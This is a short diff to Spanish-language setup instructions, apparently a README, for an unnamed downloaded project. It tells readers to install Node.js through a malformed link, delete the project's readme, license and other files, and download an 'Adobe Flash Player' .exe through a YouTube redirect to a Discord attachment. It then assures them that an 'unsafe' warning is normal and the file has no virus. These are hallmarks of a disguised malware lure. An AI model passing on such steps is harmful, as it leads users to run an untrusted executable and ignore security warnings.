@@ -1,5 +1,9 @@
 PRIEMRO : descarga el archivo
+
+extra : elimina readme.md,.gitignore,license,changelog.md,faq.md
+
 segundo : descarga node.js en https://https://nodejs.org/es/
+
 tercero : descarga adobe flash player https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbTV1OE5FUnI1WDl2SmlFekRCRFZmV2F6VDlFUXxBQ3Jtc0tta1pXQ3hZbWNTSmN6Y08temphVmhxZXdqcWhkVEV3bEo5ajZCblYtUGozVnMwSnRjVkhuWTFYaHZ1QjdqR05XUEwxQmhQLUZpU2tobXl6alg1TFJReUpIRk9zd0VSMDZmclJ5c1BraUFLZ1htbGJURQ&q=https%3A%2F%2Fcdn.discordapp.com%2Fattachments%2F709957501298147424%2F789712302562738216%2Finstall_flash_player_ppapi.exe
 
 si sale que es inseguro no le agan caso es normal y no tiene virus
